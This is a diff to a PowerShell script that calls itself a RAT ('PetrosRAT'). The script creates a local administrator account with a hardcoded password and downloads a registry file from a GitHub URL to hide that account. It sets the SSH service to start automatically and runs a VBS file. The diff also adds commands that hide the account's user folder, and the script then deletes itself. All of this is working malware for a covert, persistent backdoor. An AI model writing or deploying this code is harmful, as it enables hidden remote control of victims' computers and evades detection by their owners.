@@ -30,14 +30,16 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
+
 # create Admin User
-$uname = "PetrosRAT"
+$uname = "petrosrat"
 $pword = (ConvertTo-SecureString "PetrosRat123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
 # go to temp, make working directory
 mkdir $path
 cd $path
+
 
 # registry to hide local admin
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/wrev.reg -OutFile "wrev.reg"
@@ -54,6 +56,12 @@ Set-Service -name sshd -StartupType 'Automatic'
 
 # install the registry
 ./wrev.reg; ./calty.vbs
+
+
+# hide rat user
+cd C:/Users
+attrib +h +s +r petrosrat
+
 
 # self delete
 cd $initial_dir
